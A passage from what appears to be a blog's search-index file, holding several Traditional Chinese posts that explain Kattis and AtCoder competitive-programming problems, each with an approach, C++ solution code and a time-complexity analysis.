class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>總時間複雜度為 $O(1)$</p>
]]></content>
      <categories>
        <category>Kattis</category>
      </categories>
      <tags>
        <tag>Kattis</tag>
      </tags>
  </entry>
  <entry>
    <title>Kattis - Odd Man Out</title>
    <url>/2021/03/23/Kattis%20Odd%20Man%20Out/</url>
    <content><![CDATA[<h1 id="Kattis-Odd-Man-Out"><a href="#Kattis-Odd-Man-Out" class="headerlink" title="Kattis - Odd Man Out"></a>Kattis - Odd Man Out</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://open.kattis.com/problems/oddmanout" target="_blank" rel="noopener">https://open.kattis.com/problems/oddmanout</a></p>
<p>有 $N$ 筆測試資料，每筆測試資料包含一個數字 $G$ 以及 $G$ 個數字 $C$</p>
<p>$1 \leq N \leq 50 \quad 0 &lt; C &lt; 2^{31} \quad 3 \leq G \leq 1000$</p>
<p>對於每一筆測試資料，保證只有一個數字只出現過奇數次，求該數字為何</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>對於無序的資料，我們可以觀察看看排序之後有沒有特殊的性質可以使用</p>
<p>在這邊我們發現到，當我們將這群數字由小到大排序之後，一樣的數字都會聚集在同一個區域</p>
<p>如此一來，我們就可以直接搜尋過這些相同數字的區域，如果數字個數為奇數，那麼就找到了答案</p>
<p>更進一步的說，我們的步驟會是</p>
<ol>
<li>輸入資料</li>
<li>將資料由小到大排序</li>
<li>從第 $1$ 個元素開始，每次檢查上一個元素跟自己是否相同<ul>
<li>相同<br>  將計數器 $+1$</li>
<li>不相同<br>  檢查計數器是奇數或是偶數<ul>
<li>奇數<br>  找到答案輸出</li>
<li>偶數<br>  將計數器重整</li>
</ul>
</li>
</ul>
</li>
</ol>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n, m, out;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> Case=<span class="number">1</span> ; Case&lt;=n ; Case++)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;m;</span><br><span class="line">		<span class="keyword">int</span> arr[<span class="number">1005</span>];</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;m ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;arr[i];</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		sort(arr, arr+m);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// for 迴圈去檢查跟上一個元素是否相同 </span></span><br><span class="line">		<span class="comment">// cnt 要先算上第 0 個元素 </span></span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>, cnt=<span class="number">1</span> ; i&lt;=m ; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(arr[i] == arr[i<span class="number">-1</span>]) cnt++;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">if</span>(cnt%<span class="number">2</span> != <span class="number">0</span>)&#123;</span><br><span class="line">					out = arr[i<span class="number">-1</span>];</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span>&#123;</span><br><span class="line">					<span class="comment">// cnt 要先算上第 i 個元素 </span></span><br><span class="line">					cnt=<span class="number">1</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"Case #"</span>&lt;&lt;Case&lt;&lt;<span class="string">": "</span>&lt;&lt;out&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>輸入的時間複雜度為 $O(n)$</p>
<p>排序的時間複雜度為 $O(nlogn)$</p>
<p>搜尋答案的時間複雜度為 $O(n)$</p>
<p>總時間複雜度 $O(n + nlogn)$</p>
]]></content>
      <categories>
        <category>Kattis</category>
      </categories>
      <tags>
        <tag>Kattis</tag>
        <tag>Sort</tag>
      </tags>
  </entry>
  <entry>
    <title>Atcoder DP Contest pI</title>
    <url>/2020/06/27/Atcoder%20DP%20Contest%20pI/</url>
    <content><![CDATA[<h1 id="Atcoder-DP-Contest-pI"><a href="#Atcoder-DP-Contest-pI" class="headerlink" title="Atcoder DP Contest pI"></a>Atcoder DP Contest pI</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://atcoder.jp/contests/dp/tasks/dp_i" target="_blank" rel="noopener">https://atcoder.jp/contests/dp/tasks/dp_i</a><br>有 $n$ 個硬幣，每個硬幣有翻到正面的機率 $p_i$<br>問正面多於反面的機率有多少</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>嘗試遮住最後一個硬幣，觀察每次擲硬幣會影響到哪些<br>定義 $DP[i]$ 表示有 $i$ 個硬幣為正面的機率<br>則有轉移式 $DP[i] = DP[i-1]*arr[i] + DP[i]*(1-arr[i])$<br>且已知 $DP[0] = 1$</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">double</span> now,dp[<span class="number">3005</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n)&#123;</span><br><span class="line">		dp[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;now;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span> ; j&gt;=<span class="number">0</span> ; j--)&#123;</span><br><span class="line">				dp[j] = (j==<span class="number">0</span> ? <span class="number">0</span> : dp[j<span class="number">-1</span>]*now) + dp[j]*(<span class="number">1</span>-now);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">double</span> ans=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=n/<span class="number">2</span>+<span class="number">1</span> ; i&lt;=n ; i++)&#123;</span><br><span class="line">			ans+=dp[i];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;fixed&lt;&lt;setprecision(<span class="number">10</span>)&lt;&lt;ans&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>有 $n$ 種狀態，每種狀態轉移複雜度約為 $O(n)$<br>總複雜度 $O(n^2)$</p>
<h6 id="tags-Atcoder-DP-Contest"><a href="#tags-Atcoder-DP-Contest" class="headerlink" title="tags: Atcoder DP Contest"></a>tags: <code>Atcoder DP Contest</code></h6>]]></content>
      <categories>
        <category>AtCoder</category>
      </categories>
      <tags>
        <tag>AtCoder</tag>
        <tag>DP</tag>
      </tags>
  </entry>
  <entry>
    <title>Kattis - Conformity</title>
    <url>/2021/03/23/Kattis%20Conformity/</url>
    <content><![CDATA[<h1 id="Kattis-Conformity-UVa-11286"><a href="#Kattis-Conformity-UVa-11286" class="headerlink" title="Kattis - Conformity (UVa 11286)"></a>Kattis - Conformity (UVa 11286)</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://open.kattis.com/problems/conformity" target="_blank" rel="noopener">https://open.kattis.com/problems/conformity</a></p>
<p><a href="http://domen111.github.io/UVa-Easy-Viewer/?11286" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?11286</a></p>
<p>在一間大學當中有 $n$ 個學生，每個學生都可以選擇 5 種課程，並且課程以介於 $100$ ~ $499$ 之間的數字表示</p>
<p>每個學生選擇的課程會形成一個課程組合</p>
<p>現在學校想要統計每種課程組合有多少學生選擇，並且表揚那些選擇最受歡迎課程組合的學生</p>
<p>輸出總共要表揚多少學生</p>
<p>$1 \leq n \leq 10000$</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>首先我們要先界定一下相同的課程組合，只要選擇的課程內容相同就是同一個課程組合</p>
<p>但是選擇的先後順序不同會讓我們很困擾，所以首先將所有學生選擇的課程按照其編號由小到大排序好</p>
<p>接下來，對我們來說全部學生的課程組合就是一群無序的資料了，針對這群無序的資料可以觀察排序後有沒有甚麼好的性質可以使用</p>
<p>我們會發現到，當我們將這群資料由小到大排序後，相同的課程組合會被放在一起</p>
<p>那麼我們只需要去統計這幾群相同的序列(相同的課程組合)總共有多少組，然後記錄下最多組的人數總和即可</p>
<p>那麼，要怎麼排序這群無序的資料呢?</p>
<p>一種方法是很直觀的依序依照每個元素的大小來排序，自訂一個 compare function</p>
<p>另一種想法是這樣的，首先觀察到每個學生只能選擇 $5$ 種課程，並且課程編號都是 $3$ 位數</p>
<p>那麼，將這些數字組合起來會是一個 $15$ 位數的數字，範圍在 long long 內</p>
<p>這樣就可以將這一群資料變成一個序列了!</p>
<p>詳細來說，我們的步驟是這樣</p>
<ol>
<li>輸入</li>
<li>將每一位學生選擇的課程由小到大排序</li>
<li>將每個學生的課程組合組成一個 $15$ 位數的數字</li>
<li>將課程組合由小到大排序</li>
<li>從第 $1$ 個課程組合開始遍歷<ul>
<li>如果課程組合 $i$ 和課程組合 $i-1$ 相同<br>  將計數器 $+1$</li>
<li>如果課程組合 $i$ 和課程組合 $i-1$ 不相同<ul>
<li>如果計數器的數值大於當前紀錄的最大值<br>  更新最大值，並且更新答案</li>
<li>如果計數器的數值等同當前紀錄的最大值<br>  將答案加上計數器的數值<br>無論如何都要將計數器重整</li>
</ul>
</li>
</ul>
</li>
</ol>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n, arr[<span class="number">10000</span>][<span class="number">5</span>];</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> num[<span class="number">10000</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;<span class="number">5</span> ; j++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;arr[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 先將每個學生的課程排序</span></span><br><span class="line">		sort(arr[i], arr[i]+<span class="number">5</span>);</span><br><span class="line">		<span class="comment">// 再來組合成 15 位數</span></span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;<span class="number">5</span> ; j++)&#123;</span><br><span class="line">			num[i] *= <span class="number">100</span>;</span><br><span class="line">			num[i] += arr[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 接著排序所有課程組合</span></span><br><span class="line">	sort(num, num+n);</span><br><span class="line">	<span class="comment">// 先記錄下第一組課程組合</span></span><br><span class="line">	<span class="keyword">int</span> Max = <span class="number">1</span>, ans=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>, cnt=<span class="number">1</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(num[i] == num[i<span class="number">-1</span>]) cnt++;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(cnt &gt; Max)&#123;</span><br><span class="line">				Max = cnt;</span><br><span class="line">				ans = cnt; <span class="comment">// 當前是最新的最大值，答案正是計數器的值</span></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(cnt == Max)&#123;</span><br><span class="line">				ans += cnt;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">// 要記錄第 i 個數</span></span><br><span class="line">			cnt=<span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>輸入時間複雜度為 $O(n)$</p>
<p>排序所有學生課程的時間複雜度為 $O(5nlog5) \approx O(n)$</p>
<p>所有學生組合成 15 位數的時間複雜度為 $O(5n) \approx O(n)$</p>
<p>排序所有課程組合的時間複雜度為 $O(nlogn)$</p>
<p>遍歷所有課程組合的時間複雜度為 $O(nlogn)$</p>
<p>總時間複雜度為 $O(3n + 2nlogn) \approx O(n + nlogn)$</p>
]]></content>
      <categories>
        <category>Kattis</category>
      </categories>
      <tags>
        <tag>Kattis</tag>
        <tag>Sort</tag>
      </tags>
  </entry>
  <entry>
    <title>Kattis - Planting Trees</title>
    <url>/2021/03/23/Kattis%20Planting%20Trees/</url>
    <content><![CDATA[<h1 id="Kattis-Planting-Trees"><a href="#Kattis-Planting-Trees" class="headerlink" title="Kattis - Planting Trees"></a>Kattis - Planting Trees</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://open.kattis.com/problems/plantingtrees" target="_blank" rel="noopener">https://open.kattis.com/problems/plantingtrees</a></p>
<p>有一個園丁要種樹，每棵樹要花上一天的時間播種，並且因為園丁很懶惰，所以一天只會播種一棵樹的種子</p>
<p>聰明的園丁已經知道每棵樹會花幾天成長完成，並且園丁可以自己選擇每顆樹種下的順序</p>
<p>園丁想知道最後一顆樹成長完成的隔天是第幾天(從 1 開始計算)</p>
<p>輸入包含一個正整數 $N$，接下來有 $N$ 個正整數 $t_i$ 表示每棵樹的成長時間</p>
<p>$1 \leq N \leq 100000 \quad 1 \leq t_i \leq 1000000$</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>因為題目當中只有限制每天只能種一棵樹，但是並沒有限制要一顆樹完全成長後才能繼續種植，所以最佳解很顯然的是要從 $t_i$ 最大的樹開始種植</p>
<p>也就是說我們先依照種植時間由大到小排序，接下來模擬整個種樹的情況</p>
<p>記錄下當前剩餘成長日的最大值 $M$</p>
<p>若 $t_i &gt; M$，就將 $M$ 更新成 $t_i$</p>
<p>而每一輪的模擬都需要將 $M$ 遞減，並且將答案遞增</p>
<p>詳細來說，我們的步驟是這樣</p>
<ol>
<li>輸入資料</li>
<li>將資料由大到小排序<br> 這部分也可以由小到大排序，後面遍歷從後面往前面走即可</li>
<li>紀錄當前最大剩餘成長日 $M$ 為第 $1$ 個元素</li>
<li>因為每棵樹第一天都要先種植，答案先預設為 $1$</li>
<li>模擬接下來的 $n-1$ 天<ul>
<li>每天將 $M$ 遞減</li>
<li>每天將答案遞增</li>
<li>如果 $t_i &gt; M$<ul>
<li>更新 $M = t_i$</li>
</ul>
</li>
</ul>
</li>
<li>最後答案加上剩餘的 $M$ 再加上 $1$ 表示隔天</li>
</ol>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n, arr[<span class="number">100010</span>];</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;arr[i];</span><br><span class="line">	&#125;</span><br><span class="line">	sort(arr, arr+n);</span><br><span class="line">	<span class="comment">// 由小到大排序，所以由後往前取元素</span></span><br><span class="line">	<span class="keyword">int</span> days=arr[n<span class="number">-1</span>], ans=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=n<span class="number">-2</span> ; i&gt;=<span class="number">0</span> ; i--, ans++)&#123;</span><br><span class="line">		days--;</span><br><span class="line">		<span class="keyword">if</span>(arr[i] &gt; days)</span><br><span class="line">			days = arr[i];</span><br><span class="line">	&#125;</span><br><span class="line">	ans += (days+<span class="number">1</span>);</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>輸入時間複雜度為 $O(n)$</p>
<p>排序時間複雜度為 $O(nlogn)$</p>
<p>遍歷所有成長時間的時間複雜度為 $O(n)$</p>
<p>總時間複雜度為 $O(n + nlogn)$</p>
]]></content>
      <categories>
        <category>Kattis</category>
      </categories>
      <tags>
        <tag>Kattis</tag>
        <tag>Sort</tag>
      </tags>
  </entry>
  <entry>
    <title>Kattis - Quadrant Selection</title>
    <url>/2021/03/23/Kattis%20Quadrant%20Selection/</url>
    <content><![CDATA[<h1 id="Kattis-Quadrant-Selection"><a href="#Kattis-Quadrant-Selection" class="headerlink" title="Kattis - Quadrant Selection"></a>Kattis - Quadrant Selection</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://hackmd.io/@sa072686/Kattis_quadrant" target="_blank" rel="noopener">https://hackmd.io/@sa072686/Kattis_quadrant</a></p>
<p><a href="https://open.kattis.com/problems/quadrant" target="_blank" rel="noopener">https://open.kattis.com/problems/quadrant</a></p>
<p>輸入一個 $x, y$ 座標，輸出位在於第幾象限，保證 $x, y$ 不會有等於 0 的情況</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> x,y;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;x&gt;&gt;y;</span><br><span class="line">	<span class="keyword">if</span>(x&gt;<span class="number">0</span> &amp;&amp; y&gt;<span class="number">0</span>) <span class="built_in">cout</span>&lt;&lt;<span class="string">"1\n"</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(x&lt;<span class="number">0</span> &amp;&amp; y&gt;<span class="number">0</span>) <span class="built_in">cout</span>&lt;&lt;<span class="string">"2\n"</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(x&lt;<span class="number">0</span> &amp;&amp; y&lt;<span class="number">0</span>) <span class="built_in">cout</span>&lt;&lt;<span class="string">"3\n"</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="built_in">cout</span>&lt;&lt;<span class="string">"4\n"</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>總時間複雜度為 $O(1)$</p>
]]></content>
      <categories>
        <category>Kattis</category>
      </categories>
      <tags>
        <tag>Kattis</tag>
      </tags>
  </entry>
  <entry>
    <title>Kattis - Sort of Sorting</title>
    <url>/2021/03/23/Kattis%20Sort%20of%20Sorting/</url>
    <content><![CDATA[<h1 id="Kattis-Sort-of-Sorting"><a href="#Kattis-Sort-of-Sorting" class="headerlink" title="Kattis - Sort of Sorting"></a>Kattis - Sort of Sorting</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://open.kattis.com/problems/sortofsorting" target="_blank" rel="noopener">https://open.kattis.com/problems/sortofsorting</a></p>
<p>今天有很多字串要做排序，排序的方式是這樣的</p>
<p>要比較兩個字串的大小，我們只需要看這兩個字串的前兩個字元即可</p>
<p>而這兩組的兩個字元所組成的兩組字串比較方式是字典序</p>
<p>如果說這兩組字串的字典序是相同的，那麼就依照原本的順序排即可</p>
<p>舉例來說，要排序兩個字串 <code>Poincare</code> 以及 <code>Pochhammmer</code></p>
<p>因為前兩個字的字典序相同，所以依照原本的順序即可 <code>Poincare Pochhammmer</code></p>
<p>再舉一個例子，要排序兩個字串 <code>Beethoven</code> 以及 <code>Bach</code></p>
<p>的一個字元的字典序相同，而第二個字的字典序 <code>a</code> 比 <code>e</code> 小，所以放在前面 <code>Bach Beethoven</code></p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>其實這個排序方式就是所謂的 stable sort， 在 C++ 當中已經有這個函數可以使用</p>
<p>不同的是排序的方式，所以我們要另外寫 compare 函數</p>
<p>比較的方式在前面也有提到就不贅述，詳細可以直接看 code 當中的 <code>cmp()</code></p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="built_in">string</span> arr[<span class="number">205</span>];</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(<span class="built_in">string</span> p, <span class="built_in">string</span> q)</span></span>&#123;</span><br><span class="line">	<span class="comment">// 先比較第一個字元</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">int</span>(p[<span class="number">0</span>]) != <span class="keyword">int</span>(q[<span class="number">0</span>]))&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">int</span>(p[<span class="number">0</span>]) &lt; <span class="keyword">int</span>(q[<span class="number">0</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 再比較第二個字元</span></span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">int</span>(p[<span class="number">1</span>]) != <span class="keyword">int</span>(q[<span class="number">1</span>]))&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">int</span>(p[<span class="number">1</span>]) &lt; <span class="keyword">int</span>(q[<span class="number">1</span>]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// false 表示字典序 p&gt;=q </span></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="keyword">bool</span> out=<span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n &amp;&amp; n)&#123;</span><br><span class="line">		<span class="comment">// 在輸出之間需要有換行 </span></span><br><span class="line">		<span class="keyword">if</span>(out) <span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">		<span class="keyword">else</span> out = <span class="literal">true</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;arr[i];</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		stable_sort(arr, arr+n, cmp);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;arr[i]&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h2><p>每筆測資輸入時間複雜度 $O(n)$</p>
<p>每筆測資排序時間複雜度 $O(nlogn)$</p>
<p>每筆測資輸出時間複雜度 $O(n)$</p>
<p>每筆測茲的總時間複雜度約為 $O(n + nlogn)$</p>
]]></content>
      <categories>
        <category>Kattis</category>
      </categories>
      <tags>
        <tag>Kattis</tag>
        <tag>Sort</tag>
      </tags>
  </entry>
  <entry>
    <title>Kattis - Sticky Situation</title>
    <url>/2021/03/23/Kattis%20Sticky%20Situation/</url>
    <content><![CDATA[<h1 id="Kattis-Sticky-Situation"><a href="#Kattis-Sticky-Situation" class="headerlink" title="Kattis - Sticky Situation"></a>Kattis - Sticky Situation</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://open.kattis.com/problems/stickysituation" target="_blank" rel="noopener">https://open.kattis.com/problems/stickysituation</a></p>
<p>給定 $N$ 個正整數數字 $n$，求是否有任三個數字能組成三角形 ($a+b&gt;c$)</p>
<p>$3 \leq N \leq 20000 \quad 1 \leq n \leq 2^{60}$</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>對於一群無序的序列，可以觀察看看排序後是否有好的性質</p>
<p>在這一題當中，我們要試圖找到 $a, b, c$，其中 $a \leq b \leq c$ 且 $a + b &gt; c$</p>
<p>前提條件當中的 $a \leq b \leq c$ 可以直接透過由小到大排序解決</p>
<p>接下來也許你會想到，我們可以由小到大枚舉三角形的三邊長，然後判斷是否符合</p>
<p>但是真的有必要枚舉所有情況嗎?</p>
<p>假如我們先選擇了三個不連續的數字 $i, i+a, i+b \ (a &lt; b)$</p>
<p>如果說這三個不連續的數字能形成三角形，因為是遞增序列，可以保證 $i+(a-1), i+a, i+b$ 也一定會成立</p>
<p>同理， $i+(b-2), i+(b-1), i+b$ 也會成立</p>
<p>用更簡單的方式來說，我們只需要去枚舉連續的三個元素是否符合即可</p>
<p>也就是只需要檢查 $i, i+1, i+2$ 即可</p>
